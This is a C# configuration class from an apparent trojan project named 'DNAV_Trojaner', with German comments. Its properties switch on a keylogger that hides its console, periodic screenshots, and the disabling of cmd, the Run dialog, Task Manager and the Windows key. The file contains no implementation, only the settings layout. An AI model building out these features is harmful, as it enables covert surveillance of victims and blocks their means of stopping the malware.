using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DNAV_Trojaner
{
    public class DNAV
    {
        private bool _keyloggerAndHide;
        private bool _screenshots;
        private int _screenshotsInterval;
        private bool _disableCmd;
        private bool _disableRun;
        private bool _disableTaskmanager;
        private bool _disableWindowsKey;

        /// <summary>
        /// Legt fest, ob die Keylogger Funktion aktiviert und das Konsolenfenster versteckt wird.
        /// </summary>
        public bool KeyloggerAndHide
        {
            get
            {
                return this._keyloggerAndHide;
            }
            set
            {
                this._keyloggerAndHide = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Screenshot Funktion aktiviert wird.
        /// </summary>
        public bool Screenshots
        {
            get
            {
                return this._screenshots;
            }
            set
            {
                this._screenshots = value;
            }
        }

        /// <summary>
        /// Legt fest, in welchem Interval die Screenshots der Screenshot Funktion erstellt werden. Die Screenshot Funktion muss aktiviert sein, damit diese Eigenschaft Wirkung zeigt.
        /// </summary>
        public int ScreenshotsInterval
        {
            get
            {
                return this._screenshotsInterval;
            }
            set
            {
                this._screenshotsInterval = value >= 1 ? value : 1;
            }
        }

        /// <summary>
        /// Legt fest, ob die Konsole deaktiviert werden soll.
        /// </summary>
        public bool DisableCmd
        {
            get
            {
                return this._disableCmd;
            }
            set
            {
                this._disableCmd = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Ausführen-Dialog deaktiviert werden soll.
        /// </summary>
        public bool DisableRun
        {
            get
            {
                return this._disableRun;
            }
            set
            {
                this._disableRun = value;
            }
        }

        /// <summary>
        /// Legt fest, ob der Taskmanager deaktiviert werden soll.
        /// </summary>
        public bool DisableTaskmanager
        {
            get
            {
                return this._disableTaskmanager;
            }
            set
            {
                this._disableTaskmanager = value;
            }
        }

        /// <summary>
        /// Legt fest, ob die Windows Taste deaktiviert werden soll. Ein Klick auf das Startmenü öffnet dieses jedoch immernoch.
        /// </summary>
        public bool DisableWindowsKey
        {
            get
            {
                return this._disableWindowsKey;
            }
            set
            {
                this._disableWindowsKey = value;
            }
        }

        public DNAV()
        {
            this.KeyloggerAndHide = false;
            this.Screenshots = false;
            this.ScreenshotsInterval = 10;
            this.DisableCmd = false;
            this.DisableRun = false;
            this.DisableTaskmanager = false;
            this.DisableWindowsKey = false;
        }
    }
}
